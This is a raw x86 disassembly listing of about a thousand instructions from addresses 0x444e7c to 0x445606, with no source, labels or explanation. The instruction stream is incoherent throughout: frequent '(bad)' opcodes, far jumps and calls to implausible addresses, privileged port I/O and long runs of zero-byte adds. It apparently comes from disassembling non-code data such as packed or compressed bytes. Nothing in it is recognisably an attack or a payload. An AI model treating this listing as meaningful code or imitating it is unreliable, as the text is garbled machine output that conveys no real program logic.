  444e7c:	push   0x6f
  444e7e:	mov    eax,es
  444e80:	mov    dh,0x23
  444e82:	mov    al,ds:0x95713000
  444e87:	jo     0x444eb9
  444e89:	jle    0x444ede
  444e8b:	mov    bl,0xf6
  444e8d:	add    al,0x90
  444e8f:	mov    dl,0x5e
  444e91:	stos   DWORD PTR es:[edi],eax
  444e92:	lahf   
  444e93:	push   edi
  444e94:	repnz fiadd DWORD PTR [eax]
  444e97:	add    BYTE PTR [eax],al
  444e99:	add    BYTE PTR [eax],al
  444e9b:	pop    esp
  444e9c:	cmp    al,0xb8
  444e9e:	test   BYTE PTR [eax-0x4e],dl
  444ea1:	test   BYTE PTR [ebx],0x90
  444ea4:	cmp    DWORD PTR [edi-0xc],ecx
  444ea7:	int3   
  444ea8:	outs   dx,BYTE PTR ds:[esi]
  444ea9:	aaa    
  444eaa:	imul   ebx,esp,0xfca719e5
  444eb0:	jbe    0x444e55
  444eb2:	aaa    
  444eb3:	dec    ebx
  444eb4:	ja     0x444e71
  444eb6:	aaa    
  444eb7:	pop    ebx
  444eb8:	ja     0x444ee4
  444eba:	jnp    0x444ef7
  444ebc:	xor    BYTE PTR [ebx-0x79],ch
  444ebf:	adc    al,0xde
  444ec1:	(bad)  
  444ec2:	rcl    bh,cl
  444ec4:	mov    bl,0x20
  444ec6:	cmp    edx,DWORD PTR [edx+esi*2]
  444ec9:	mov    dh,0x24
  444ecb:	xchg   edi,eax
  444ecc:	mov    bh,0xb6
  444ece:	lods   eax,DWORD PTR ds:[esi]
  444ecf:	push   ss
  444ed0:	out    dx,al
  444ed1:	fwait
  444ed2:	jl     0x444f26
  444ed4:	sbb    bl,BYTE PTR [esi-0x40]
  444ed7:	cmp    edi,DWORD PTR [edx]
  444ed9:	mov    edx,0x83ee0e53
  444ede:	jl     0x444f32
  444ee0:	or     bl,BYTE PTR [esi-0x40]
  444ee3:	sbb    edi,DWORD PTR [edx]
  444ee5:	mov    dl,0x43
  444ee7:	jl     0x444f5b
  444ee9:	mov    BYTE PTR [edx+0x4a],bh
  444eec:	mov    dh,0x72
  444eee:	xor    DWORD PTR [ebx-0x58],eax
  444ef1:	cld    
  444ef2:	cld    
  444ef3:	or     ch,BYTE PTR [eax]
  444ef5:	test   DWORD PTR [ebx],0x4ef0b290
  444efb:	fwait
  444efc:	jmp    0x444e8f
  444efe:	push   es
  444eff:	add    BYTE PTR [eax],al
  444f01:	add    BYTE PTR [eax],al
  444f03:	add    BYTE PTR [ebx-0xb],dl
  444f06:	pop    ebx
  444f07:	js     0x444f54
  444f09:	cmc    
  444f0a:	push   ebx
  444f0b:	ret    
  444f0c:	les    esi,FWORD PTR [eax+0xe]
  444f0f:	jnp    0x444eae
  444f11:	cs arpl cx,dx
  444f14:	cli    
  444f15:	mov    ecx,0xfb883497
  444f1a:	sbb    cl,ch
  444f1c:	xchg   ebx,eax
  444f1d:	mov    dl,0x7e
  444f1f:	dec    edi
  444f20:	adc    edi,eax
  444f22:	push   ebx
  444f23:	test   DWORD PTR [edi+edi*4+0x3b113110],edx
  444f2a:	(bad)  
  444f2d:	sub    al,0x53
  444f2f:	lds    ebx,FWORD PTR [ecx+0x6b]
  444f32:	pusha  
  444f33:	in     al,0xba
  444f35:	lock jmp 0x4b14:0xce307472
  444f3d:	cs push ebx
  444f3f:	std    
  444f40:	test   al,0xb3
  444f42:	shl    DWORD PTR [esp],1
  444f45:	or     DWORD PTR [edi],0xffffffe9
  444f48:	xchg   ebx,eax
  444f49:	sub    eax,0xad8ad95b
  444f4e:	(bad)  
  444f4f:	jmp    0x60427d5b
  444f54:	cli    
  444f55:	lds    ecx,FWORD PTR [esi]
  444f57:	in     eax,dx
  444f58:	sub    al,0x72
  444f5a:	adc    al,ch
  444f5c:	xchg   ebx,eax
  444f5d:	mov    dl,0xe
  444f5f:	sbb    cl,BYTE PTR [ecx+ebp*8-0x6b]
  444f63:	inc    esp
  444f64:	aaa    
  444f65:	push   es
  444f66:	cmp    eax,0x82
  444f6b:	add    BYTE PTR [eax],al
  444f6d:	xchg   ebx,eax
  444f6e:	mov    dl,0xe
  444f70:	jmp    0xe4a4554d
  444f75:	and    eax,0x5f8c6ac6
  444f7a:	inc    ebx
  444f7b:	(bad)  
  444f7c:	in     al,dx
  444f7d:	sar    BYTE PTR [ebp-0x3a],1
  444f80:	fwait
  444f81:	cmp    BYTE PTR [esi-0x2b],0x9a
  444f85:	nop
  444f86:	sub    ecx,DWORD PTR [ebx+0xd]
  444f89:	dec    edx
  444f8a:	inc    esp
  444f8b:	jmp    0x93f2f890
  444f90:	retf   0x12fc
  444f93:	sub    eax,0x5def6e00
  444f98:	dec    ebp
  444f99:	aad    0xb3
  444f9b:	fsubr  DWORD PTR [ebx]
  444f9d:	aaa    
  444f9e:	inc    DWORD PTR cs:[eax-0x6]
  444fa2:	lods   al,BYTE PTR ds:[esi]
  444fa3:	push   ss
  444fa4:	jbe    0x444ff4
  444fa6:	mov    ebx,0x83f4085c
  444fab:	addr16 adc esp,esp
  444fae:	scas   eax,DWORD PTR es:[edi]
  444faf:	pop    ebp
  444fb0:	add    eax,0x73e8adba
  444fb5:	xor    ecx,DWORD PTR [ebx]
  444fb7:	inc    esi
  444fb8:	xor    ecx,0xffffffb6
  444fbb:	inc    edi
  444fbc:	mov    eax,DWORD PTR [ecx+ebx*1]
  444fbf:	stos   BYTE PTR es:[edi],al
  444fc0:	xor    edi,ecx
  444fc2:	pop    ds
  444fc3:	nop
  444fc4:	inc    ebp
  444fc5:	mov    bh,0xed
  444fc7:	jmp    0x444fc8
  444fc9:	sub    DWORD PTR [esi-0x1e63f70d],esi
  444fcf:	sub    eax,0x0
  444fd4:	add    BYTE PTR [eax],al
  444fd6:	stc    
  444fd7:	mov    ch,0xe
  444fd9:	nop
  444fda:	xchg   edi,eax
  444fdb:	mov    ebx,0x1f750555
  444fe0:	jmp    0xfbc0:0x6ae1e44b
  444fe7:	pop    ds
  444fe8:	nop
  444fe9:	dec    esp
  444fea:	hlt    
  444feb:	shr    DWORD PTR [edx-0x8],0xef
  444fef:	and    esi,eax
  444ff1:	mov    esi,esp
  444ff3:	inc    ebp
  444ff4:	cmp    al,al
  444ff6:	xor    al,0x83
  444ff8:	pop    ebp
  444ff9:	sub    al,0xd7
  444ffb:	xor    ah,BYTE PTR ds:0x931a947
  445001:	orps   xmm1,XMMWORD PTR [ecx+0x4e]
  445005:	cmovbe ecx,DWORD PTR [ecx]
  445008:	push   esp
  445009:	test   BYTE PTR [eax+0x361b98d4],dl
  44500f:	shr    cl,cl
  445011:	dec    ecx
  445012:	xchg   DWORD PTR [eax+0x40f640e1],eax
  445018:	test   al,0x4a
  44501a:	or     al,0xd4
  44501c:	cwde   
  44501d:	pop    es
  44501e:	or     eax,0xd083a01f
  445023:	xchg   esp,eax
  445024:	shl    BYTE PTR [edx+0x44],1
  445027:	(bad)  
  445028:	aam    0x83
  44502a:	js     0x445077
  44502c:	stos   BYTE PTR es:[edi],al
  44502d:	neg    DWORD PTR [edi+0x70]
  445030:	or     eax,0x66839e6d
  445035:	adc    edx,DWORD PTR [edi-0x6a]
  445038:	out    dx,al
  445039:	nop
  44503a:	add    BYTE PTR [eax],al
  44503c:	add    BYTE PTR [eax],al
  44503e:	add    ch,dl
  445040:	mov    edx,DWORD PTR [edx]
  445042:	mov    edi,0x45c26bd5
  445047:	ror    BYTE PTR [ebx-0x66],1
  44504a:	inc    ebp
  44504b:	xor    al,0x24
  44504d:	and    bh,BYTE PTR [eax+0x529680]
  445053:	ins    DWORD PTR es:[edi],dx
  445054:	dec    ebp
  445055:	adc    eax,DWORD PTR [eax]
  445057:	nop
  445058:	ret    0xd457
  44505b:	dec    eax
  44505c:	fwait
  44505d:	aas    
  44505e:	inc    eax
  44505f:	nop
  445060:	jbe    0x445075
  445062:	add    dl,BYTE PTR [eax-0x13c22bb5]
  445068:	dec    edx
  445069:	adc    al,BYTE PTR [eax]
  44506b:	nop
  44506c:	in     al,0xff
  44506e:	mov    cl,BYTE PTR [ebp+0x47]
  445071:	call   0x83dc:0x5797bc3d
  445078:	dec    ebx
  445079:	or     eax,0xed161900
  44507e:	mov    ebx,DWORD PTR [ebp+0x5f]
  445081:	cwde   
  445082:	adc    al,BYTE PTR [ebx-0x47c26475]
  445088:	mov    cl,0x5e
  44508a:	dec    ecx
  44508b:	mov    esp,0x1bd3ba2a
  445090:	out    dx,eax
  445091:	add    edi,DWORD PTR [ecx+edx*4-0x3cfc084e]
  445098:	push   ecx
  445099:	pop    esi
  44509a:	pop    ecx
  44509b:	js     0x4450c9
  44509d:	setno  al
  4450a0:	aas    
  4450a1:	outs   dx,BYTE PTR ds:[esi]
  4450a2:	add    DWORD PTR [eax],0x0
  4450a8:	dec    esp
  4450a9:	sub    dh,BYTE PTR [edx-0x5c11f625]
  4450af:	xchg   BYTE PTR [esi-0x4e],ah
  4450b2:	inc    edx
  4450b3:	or     ebx,DWORD PTR [ebp-0x6ffc0b1a]
  4450b9:	dec    ebx
  4450ba:	in     eax,dx
  4450bb:	xchg   BYTE PTR [esi-0x4b],bl
  4450be:	sub    cl,BYTE PTR [edi]
  4450c0:	test   edx,esp
  4450c2:	cmc    
  4450c3:	add    edx,DWORD PTR [eax-0x6e108b51]
  4450c9:	mov    dl,0xf7
  4450cb:	mov    es,ebp
  4450cd:	sahf   
  4450ce:	pop    esi
  4450cf:	pop    eax
  4450d0:	and    BYTE PTR [ecx+esi*8-0x70],cl
  4450d4:	fnstenv [edx+0x2c4c806c]
  4450da:	and    bh,al
  4450dc:	or     ebp,esi
  4450de:	mov    ?,WORD PTR [di+0x56]
  4450e2:	pop    ebp
  4450e3:	(bad)  
  4450e4:	mov    edx,0xa1486f74
  4450e9:	scas   eax,DWORD PTR es:[edi]
  4450ea:	and    BYTE PTR [ebx+ecx*1],al
  4450ed:	imul   ebp,DWORD PTR [edx+edx*8],0x65
  4450f1:	lods   al,BYTE PTR ds:[esi]
  4450f2:	xor    DWORD PTR [eax-0x80],ecx
  4450f5:	mov    dl,0xd9
  4450f7:	mov    WORD PTR [ebp+0x5e2d4ca4],ds
  4450fd:	mov    al,ds:0xafc0485c
  445102:	pusha  
  445103:	add    ebx,DWORD PTR [ebx]
  445105:	out    dx,al
  445106:	push   cs
  445107:	dec    ecx
  445108:	xchg   esi,eax
  445109:	jb     0x44509f
  44510b:	fld    QWORD PTR [eax]
  44510d:	add    BYTE PTR [eax],al
  44510f:	add    BYTE PTR [eax],al
  445111:	mov    ebp,DWORD PTR [edx]
  445113:	pop    ebx
  445114:	stc    
  445115:	push   ds
  445116:	test   dl,0x87
  445119:	push   ss
  44511a:	aas    
  44511b:	adc    DWORD PTR [edi+0x1fc7e0c],ecx
  445121:	test   DWORD PTR [ebx-0x5d27d029],eax
  445127:	outs   dx,BYTE PTR ds:[esi]
  445128:	xchg   DWORD PTR [esi*8-0x74b19e04],edx
  44512f:	aam    0x62
  445131:	dec    edx
  445132:	sub    ebp,DWORD PTR [ebx-0x1f]
  445135:	cs mov cl,0xe
  445138:	jmp    0x6330b4d0
  44513d:	iret   
  44513e:	dec    esi
  44513f:	mov    ebp,0xf6f505be
  445144:	jo     0x44511d
  445146:	push   0xffffff9b
  445148:	cmc    
  445149:	push   ds
  44514a:	mov    dl,0xe
  44514c:	jmp    0x5d2b04e4
  445151:	mov    al,ds:0x842494f9
  445156:	xor    eax,0xb293e985
  44515b:	push   cs
  44515c:	ret    0x8b41
  44515f:	int3   
  445160:	pusha  
  445161:	pop    ebx
  445162:	int    0xe6
  445164:	je     0x4451c3
  445166:	inc    edi
  445167:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445168:	call   0x9a530400
  44516d:	hlt    
  44516e:	sub    bl,BYTE PTR [ebx+0x71]
  445171:	(bad)  
  445173:	(bad)  
  445174:	hlt    
  445175:	add    BYTE PTR [eax],al
  445177:	add    BYTE PTR [eax],al
  445179:	add    BYTE PTR [esi],bl
  44517b:	push   ds
  44517c:	xor    ch,cl
  44517e:	xchg   ebx,eax
  44517f:	mov    dl,0xe
  445181:	cmp    ah,ch
  445183:	mov    esp,0xbcd5d4cf
  445188:	into   
  445189:	add    BYTE PTR ds:0x865093af,cl
  44518f:	xchg   ebp,eax
  445190:	mov    edi,0x5b2b9903
  445195:	clc    
  445196:	push   edx
  445197:	test   eax,0xb67145a9
  44519c:	push   cs
  44519d:	add    BYTE PTR [ecx-0x540fd4cb],bh
  4451a3:	cli    
  4451a4:	loopne 0x4451a5
  4451a6:	test   eax,0x3d0148b2
  4451ab:	fisttp QWORD PTR [edx+0x437f5f75]
  4451b1:	in     al,dx
  4451b2:	jbe    0x4451ea
  4451b4:	aad    0x0
  4451b6:	imul   esi,DWORD PTR [edx-0x5cb6b26b],0xf4e211b9
  4451c0:	adc    cl,BYTE PTR [edi]
  4451c2:	(bad)  
  4451c3:	popf   
  4451c4:	cmp    esp,DWORD PTR ds:[edx+esi*4-0x4c9279ea]
  4451cc:	out    0xff,al
  4451ce:	ret    0xd2c4
  4451d1:	and    edi,DWORD PTR [esi+edi*1-0x69]
  4451d5:	jne    0x4451c4
  4451d7:	jle    0x445254
  4451d9:	shl    BYTE PTR [esi],1
  4451db:	ss or  al,0xff
  4451de:	add    BYTE PTR [eax],al
  4451e0:	add    BYTE PTR [eax],al
  4451e2:	add    BYTE PTR [esi],al
  4451e4:	mov    bl,0x9a
  4451e6:	push   ebp
  4451e7:	std    
  4451e8:	xor    al,0xbc
  4451ea:	jne    0x44521d
  4451ec:	das    
  4451ed:	push   ebx
  4451ee:	cld    
  4451ef:	sub    ah,0xfa
  4451f2:	mov    ebp,DWORD PTR [eax]
  4451f4:	das    
  4451f5:	sub    ebp,eax
  4451f7:	jb     0x4451e5
  4451f9:	(bad)  
  4451fa:	(bad)  
  4451fb:	in     eax,dx
  4451fc:	sub    DWORD PTR [ebp-0x68937d35],edx
  445202:	inc    ebp
  445203:	inc    ecx
  445204:	stc    
  445205:	push   cs
  445206:	add    BYTE PTR [eax-0x3efcf2b5],dl
  44520c:	js     0x4451fb
  44520e:	cmp    esp,DWORD PTR [ebp-0x19]
  445211:	bound  edx,QWORD PTR ds:0x9c400815
  445217:	and    BYTE PTR [ebp-0x5a],dl
  44521a:	imul   edx,DWORD PTR ss:[eax+edx*4+0x53472ec0],0x41
  445223:	adc    edx,DWORD PTR [esi+0x60d00313]
  445229:	inc    eax
  44522a:	in     al,0x22
  44522c:	mov    al,0x9a
  44522e:	ins    DWORD PTR es:[edi],dx
  44522f:	push   esp
  445230:	rol    BYTE PTR [eax-0x28],0x1b
  445234:	push   ss
  445235:	adc    eax,0xd4b91b7
  44523a:	add    BYTE PTR [ebx-0x4c],ah
  44523d:	adc    cl,bh
  44523f:	sbb    esi,edx
  445241:	(bad)  
  445242:	mov    DWORD PTR [ebp+0xf88d73],edi
  445248:	add    BYTE PTR [eax],al
  44524a:	add    BYTE PTR [eax],al
  44524c:	xchg   ecx,eax
  44524d:	ficomp WORD PTR [edx]
  44524f:	sbb    DWORD PTR [edx-0x79],0x6090000d
  445256:	adc    eax,0x66494883
  44525b:	or     BYTE PTR [ecx],dl
  44525d:	add    DWORD PTR [edx+0x2],eax
  445260:	nop
  445261:	dec    ebx
  445262:	pop    esp
  445263:	push   0x1b
  445265:	std    
  445266:	xchg   esp,eax
  445267:	ins    DWORD PTR es:[edi],dx
  445268:	jl     0x44522a
  44526a:	adc    BYTE PTR [eax+0x695bb8c],cl
  445270:	or     dl,BYTE PTR [esi-0x25ab76f2]
  445276:	adc    ecx,DWORD PTR [ebx-0x17c03f72]
  44527c:	stos   DWORD PTR es:[edi],eax
  44527d:	adc    edx,ebx
  44527f:	stc    
  445280:	xchg   edx,eax
  445281:	rol    BYTE PTR [edi-0x30],cl
  445284:	jbe    0x445238
  445286:	pop    esi
  445287:	push   eax
  445288:	add    BYTE PTR [eax+0x3ce6623e],dh
  44528e:	inc    eax
  44528f:	mov    edx,DWORD PTR [ebp+0x3cc4723a]
  445295:	fwait
  445296:	std    
  445297:	pusha  
  445298:	mov    ah,0x80
  44529a:	add    eax,0xc5e70966
  44529f:	mov    al,BYTE PTR [ebp+0x4a]
  4452a2:	xor    DWORD PTR [ecx-0x80],ecx
  4452a5:	repnz pop edi
  4452a7:	popa   
  4452a8:	sub    DWORD PTR [ecx],0xae0913ba
  4452ae:	jne    0x44523b
  4452b0:	add    BYTE PTR [eax],al
  4452b2:	add    BYTE PTR [eax],al
  4452b4:	add    BYTE PTR [ebp+0x5a],dl
  4452b7:	ins    BYTE PTR es:[edi],dx
  4452b8:	pop    ecx
  4452b9:	test   BYTE PTR [esi],ch
  4452bb:	jecxz  0x445245
  4452bd:	nop
  4452be:	mov    dl,0xf7
  4452c0:	add    ecx,DWORD PTR [ebx]
  4452c2:	test   bl,0x4
  4452c5:	mov    BYTE PTR [edi],ah
  4452c7:	mov    dl,0x1b
  4452c9:	retf   
  4452ca:	fistp  DWORD PTR [esi+0x13]
  4452cd:	mov    ds:0x3d8b2972,eax
  4452d2:	fidiv  WORD PTR [edx+ebx*2+0x3f5fabf]
  4452d9:	nop
  4452da:	mov    dl,0x31
  4452dc:	mov    esp,DWORD PTR [ebp-0x22]
  4452df:	mov    ah,0xcf
  4452e1:	push   esp
  4452e2:	outs   dx,DWORD PTR ds:[esi]
  4452e3:	or     cl,BYTE PTR [ebx+0xc32282c]
  4452e9:	sbb    ebp,DWORD PTR [ebx-0x604b3386]
  4452ef:	pop    esp
  4452f0:	pop    eax
  4452f1:	and    BYTE PTR [edi],0x37
  4452f4:	and    dl,al
  4452f6:	daa    
  4452f7:	and    dl,BYTE PTR [eax]
  4452f9:	(bad)  
  4452fb:	nop
  4452fc:	aam    0x13
  4452fe:	ja     0x4452fb
  445300:	pusha  
  445301:	shl    DWORD PTR [edi],cl
  445303:	push   cs
  445304:	and    al,0x9c
  445306:	daa    
  445307:	inc    ebx
  445308:	fld    QWORD PTR [edi+eiz*1+0x56]
  44530c:	add    eax,0x93e2742
  445311:	inc    ebp
  445312:	inc    ebx
  445313:	mov    esp,0x4bb6cf6a
  445318:	sub    al,BYTE PTR [eax]
  44531a:	add    BYTE PTR [eax],al
  44531c:	add    BYTE PTR [eax],al
  44531e:	fbstp  TBYTE PTR [esi-0x26]
  445321:	xor    eax,0x2dda76d7
  445326:	iret   
  445327:	jbe    0x445303
  445329:	pushf  
  44532a:	or     dl,BYTE PTR [edi-0x6b]
  44532d:	pushf  
  44532e:	fwait
  44532f:	daa    
  445330:	dec    edi
  445331:	stc    
  445332:	sbb    BYTE PTR [ebx+0x62],dh
  445335:	add    cl,BYTE PTR [ebx]
  445337:	out    dx,al
  445338:	push   es
  445339:	bound  eax,QWORD PTR [esi+eiz*4+0x3c]
  44533d:	(bad)  
  44533e:	call   0xe8b68ff1
  445343:	mov    ds:0xb6d8723c,al
  445348:	cmp    al,0x98
  44534a:	jbe    0x4453ae
  44534c:	lea    esp,ds:0x72cde587
  445352:	iret   
  445353:	mov    ds:0x7299bb1d,al
  445358:	arpl   sp,bp
  44535a:	cwde   
  44535b:	in     eax,dx
  44535c:	add    dl,BYTE PTR [ebp-0x69]
  44535f:	das    
  445360:	(bad)  
  445361:	(bad)  
  445362:	out    0x6f,eax
  445364:	xchg   ebp,eax
  445365:	adc    al,0x9c
  445367:	loopne 0x4452fe
  445369:	sbb    BYTE PTR [eax-0x1e],dh
  44536c:	xchg   ebp,eax
  44536d:	and    al,0x80
  44536f:	loop   0x445306
  445371:	sub    BYTE PTR [eax+eiz*8-0x17],dh
  445375:	mov    ecx,0x33fdfe11
  44537a:	push   ecx
  44537b:	jbe    0x445357
  44537d:	popf   
  44537e:	loopne 0x4453f5
  445380:	fiadd  DWORD PTR [eax]
  445382:	add    BYTE PTR [eax],al
  445384:	add    BYTE PTR [eax],al
  445386:	add    BYTE PTR ds:0x2dccd262,bh
  44538c:	(bad)
  445391:	repnz mov esi,DWORD PTR [esi+ebp*4-0x51168773]
  445399:	xchg   ebp,eax
  44539a:	dec    ebp
  44539b:	in     eax,dx
  44539c:	sub    DWORD PTR [esi],edi
  44539e:	sbb    al,0x18
  4453a0:	loope  0x44541c
  4453a2:	or     dh,BYTE PTR [edx]
  4453a4:	not    BYTE PTR [edx]
  4453a6:	jmp    FWORD PTR [ecx+0x1c08aa31]
  4453ac:	jb     0x445343
  4453ae:	inc    eax
  4453af:	test   DWORD PTR ds:0xae7583be,edi
  4453b5:	(bad)  
  4453b6:	clc    
  4453b7:	outs   dx,BYTE PTR ds:[esi]
  4453b8:	ret    
  4453b9:	jmp    0xd475bcc8
  4453be:	(bad)  
  4453bf:	fdiv   QWORD PTR [ecx+0x1d]
  4453c2:	sar    BYTE PTR [ebx+esi*2],cl
  4453c5:	xchg   ebp,eax
  4453c6:	jmp    DWORD PTR [ebx+ebp*1]
  4453c9:	repnz or DWORD PTR [ebp+0x69000c5e],0x35602a15
  4453d4:	mov    dh,0x1d
  4453d6:	(bad)
  4453d9:	loop   0x445364
  4453db:	hlt    
  4453dc:	push   ebp
  4453dd:	jecxz  0x4453de
  4453df:	ds sub eax,0x375cdc93
  4453e5:	loope  0x445370
  4453e7:	in     al,0x5d
  4453e9:	jecxz  0x4453ea
  4453eb:	add    BYTE PTR [eax],al
  4453ed:	add    BYTE PTR [eax],al
  4453ef:	add    dh,bh
  4453f1:	sub    al,0x83
  4453f3:	aam    0xfc
  4453f5:	ss loope 0x445381
  4453f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4453f9:	gs jecxz 0x4453fb
  4453fc:	out    dx,al
  4453fd:	sub    al,0xa3
  4453ff:	int3   
  445400:	cld    
  445401:	ss loope 0x44546a
  445404:	nop
  445405:	iret   
  445406:	cmp    al,0xd
  445409:	sub    edx,ebp
  44540b:	pop    esi
  44540c:	adc    al,0xbf
  44540e:	stc    
  44540f:	cmc    
  445410:	(bad)  
  445411:	mov    eax,0x14158473
  445416:	call   0x7ef64412
  44541b:	jge    0x4453e9
  44541d:	into   
  44541e:	jmp    0xd5c0:0xb0c776f7
  445425:	loopne 0x445411
  445427:	pop    esi
  445428:	sbb    al,0xb7
  44542a:	test   eax,0x89f0c7f5
  44542f:	xchg   DWORD PTR ds:0xb7f7e87c,edx
  445435:	aam    0x50
  445437:	cld    
  445438:	sbb    bh,cl
  44543a:	cmc    
  44543b:	cmc    
  44543c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44543d:	nop
  44543e:	cwde   
  44543f:	cmp    eax,0x30909094
  445444:	xchg   ebp,eax
  445445:	mov    al,ds:0x4a9001ea
  44544a:	or     eax,0xeb370d89
  44544f:	idiv   DWORD PTR [edi-0x3c]
  445452:	dec    ebp
  445453:	hlt    
  445454:	add    BYTE PTR [eax],al
  445456:	add    BYTE PTR [eax],al
  445458:	add    al,ch
  44545a:	pop    ebx
  44545b:	pop    ebx
  44545c:	inc    eax
  44545d:	nop
  44545e:	rcl    BYTE PTR [eax-0x1aaf9a24],cl
  445464:	test   DWORD PTR [ebp-0x6fbfffcd],0x83f457d4
  44546e:	push   ss
  44546f:	cli    
  445470:	push   cs
  445471:	nop
  445472:	dec    ebx
  445473:	or     eax,0xe5c453c9
  445478:	dec    ebp
  445479:	or     ebp,DWORD PTR [edi+0x47]
  44547c:	jmp    0xf8295d60
  445481:	push   esp
  445482:	mov    dl,0xb0
  445484:	and    DWORD PTR [eax+0x4c0437a0],edi
  44548a:	mov    sp,0xcc08
  44548e:	shl    BYTE PTR [ebx],cl
  445490:	add    al,0x75
  445492:	mov    ch,0xb5
  445494:	add    al,0x90
  445496:	dec    ebx
  445497:	lea    eax,[ebx]
  445499:	nop
  44549a:	mov    dl,0x6c
  44549c:	sti    
  44549d:	pop    esi
  44549e:	sub    eax,0xbdd13f65
  4454a3:	call   0xe5024328
  4454a8:	push   esi
  4454a9:	or     edi,DWORD PTR [ecx]
  4454ab:	ins    DWORD PTR es:[edi],dx
  4454ac:	sbb    eax,0x1c6fa21a
  4454b1:	dec    esi
  4454b2:	sub    al,dh
  4454b4:	inc    ebx
  4454b5:	push   ecx
  4454b6:	das    
  4454b7:	and    DWORD PTR [ecx-0x3f],esi
  4454ba:	fadd   QWORD PTR [ecx+0xc6]
  4454c0:	add    BYTE PTR [eax],al
  4454c2:	aam    0x65
  4454c4:	or     ecx,eax
  4454c6:	int3   
  4454c7:	gs and ecx,eax
  4454ca:	aam    0x65
  4454cc:	cmp    ecx,eax
  4454ce:	int3   
  4454cf:	gs ins BYTE PTR es:[edi],dx
  4454d1:	sti    
  4454d2:	(bad)  [ebx]
  4454d4:	jmp    0x44552a
  4454d6:	sbb    ebx,esi
  4454d8:	fist   WORD PTR [edx+0xb]
  4454db:	cmp    ecx,esp
  4454dd:	std    
  4454de:	out    0xc8,al
  4454e0:	ins    BYTE PTR es:[edi],dx
  4454e1:	dec    ecx
  4454e2:	xchg   esp,eax
  4454e3:	and    eax,0x29c30df3
  4454e8:	cmp    bh,al
  4454ea:	into   
  4454eb:	dec    ebx
  4454ec:	hlt    
  4454ed:	mov    cl,cl
  4454ef:	mov    dl,0x6c
  4454f1:	jo     0x445537
  4454f3:	sub    al,0x9d
  4454f5:	ds aaa 
  4454f7:	rcr    BYTE PTR [ecx],0x89
  4454fa:	sbb    al,0x8f
  4454fc:	test   DWORD PTR [ebx],0x620eb290
  445502:	fsub   DWORD PTR [esi+0x3fbd173d]
  445508:	inc    ebx
  445509:	stc    
  44550a:	push   ss
  44550b:	neg    DWORD PTR [ecx]
  44550d:	fs push ebx
  44550f:	ror    DWORD PTR [edx+eiz*2],0xe9
  445513:	mov    bl,0x63
  445515:	ffree  st(6)
  445517:	inc    edi
  445518:	pusha  
  445519:	mov    cs,WORD PTR [esi]
  44551b:	out    dx,al
  44551c:	sbb    dh,BYTE PTR [edx+0x60]
  44551f:	stos   BYTE PTR es:[edi],al
  445520:	xchg   ebp,eax
  445521:	js     0x445541
  445523:	clc    
  445524:	and    al,0x8e
  445526:	add    BYTE PTR [eax],al
  445528:	add    BYTE PTR [eax],al
  44552a:	add    BYTE PTR [edi-0x61],dh
  44552d:	xchg   ebx,eax
  44552e:	xor    BYTE PTR [edi-0x65],ch
  445531:	xchg   ebp,eax
  445532:	xor    ah,BYTE PTR [esi-0x549c8191]
  445538:	sub    al,0x2
  44553a:	call   0xb753f45a
  44553f:	or     esp,DWORD PTR [ebx-0x3a3e9bb2]
  445545:	fisub  WORD PTR [edx+0x58]
  445548:	scas   al,BYTE PTR es:[edi]
  445549:	xchg   ebp,eax
  44554a:	xchg   esp,eax
  44554b:	fwait
  44554c:	mov    esp,edi
  44554e:	loop   0x4454ed
  445550:	(bad)  
  445551:	mov    dl,0xbf
  445553:	fist   WORD PTR ss:[ebp-0x258c17f4]
  44555a:	sbb    eax,0x35da6e4f
  44555f:	push   edi
  445560:	outs   dx,BYTE PTR ds:[esi]
  445561:	fisubr DWORD PTR ds:0x62da6e4f
  445567:	push   0xffffffe5
  445569:	xchg   ebp,eax
  44556a:	std    
  44556b:	adc    ecx,DWORD PTR [esi+0xe]
  44556e:	call   0x72820806
  445573:	mov    edi,0xc76241aa
  445578:	scas   al,BYTE PTR es:[edi]
  445579:	xchg   ebx,eax
  44557a:	mov    dl,0xb7
  44557c:	mov    dl,BYTE PTR [ebx+0xac25600]
  445582:	call   FWORD PTR [ebx+ebx*8+0x18]
  445586:	inc    eax
  445587:	cmp    ebp,eax
  445589:	push   cs
  44558a:	push   0x39
  44558c:	lds    ecx,FWORD PTR [esi]
  44558e:	push   0x0
  445590:	add    BYTE PTR [eax],al
  445592:	add    BYTE PTR [eax],al
  445594:	sub    ebp,eax
  445596:	push   cs
  445597:	(bad)  
  445598:	sub    DWORD PTR [ecx+0x4af9000e],esp
  44559e:	enter  0x16fe,0x39
  4455a2:	(bad)  
  4455a3:	(bad)  
  4455a4:	fstp   st(1)
  4455a6:	inc    ebp
  4455a7:	mov    ecx,DWORD PTR [edi+ebx*8]
  4455aa:	int    0x56
  4455ac:	jb     0x445575
  4455ae:	inc    BYTE PTR [edi+ebx*2-0xb7d173c]
  4455b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4455b6:	push   cs
  4455b7:	jne    0x445545
  4455b9:	cmp    DWORD PTR [ebx],ebx
  4455bb:	pop    eax
  4455bc:	iret   
  4455bd:	repnz push cs
  4455bf:	push   0xffffffb9
  4455c1:	les    ecx,FWORD PTR [esi]
  4455c3:	push   0xffffffa9
  4455c5:	les    ecx,FWORD PTR [esi]
  4455c7:	push   0xffffffa9
  4455c9:	jno    0x4455d9
  4455cb:	push   ss
  4455cc:	mov    ecx,0x1de80eb2
  4455d1:	cmp    al,0xe1
  4455d3:	jmp    FWORD PTR [edx]
  4455d5:	jb     0x4455f1
  4455d7:	pop    esi
  4455d8:	(bad)  
  4455d9:	aad    0x95
  4455db:	in     eax,0x44
  4455dd:	outs   dx,DWORD PTR ds:[esi]
  4455de:	(bad)  
  4455df:	(bad)  
  4455e0:	jnp    0x4455a2
  4455e2:	cli    
  4455e3:	dec    edi
  4455e4:	xchg   BYTE PTR [ebx],cl
  4455e6:	loopne 0x4455eb
  4455e8:	xchg   edx,eax
  4455e9:	jae    0x445616
  4455eb:	hlt    
  4455ec:	jns    0x4455a0
  4455ee:	push   cs
  4455ef:	add    al,dh
  4455f1:	fucom  st(2)
  4455f3:	mov    esp,esi
  4455f5:	ss xchg ebx,eax
  4455f7:	fwait
  4455f8:	add    BYTE PTR [eax],al
  4455fa:	add    BYTE PTR [eax],al
  4455fc:	add    BYTE PTR [ecx-0x4e],ch
  4455ff:	push   cs
  445600:	add    BYTE PTR [eax+0x532bced0],dl
  445606:	cdq    
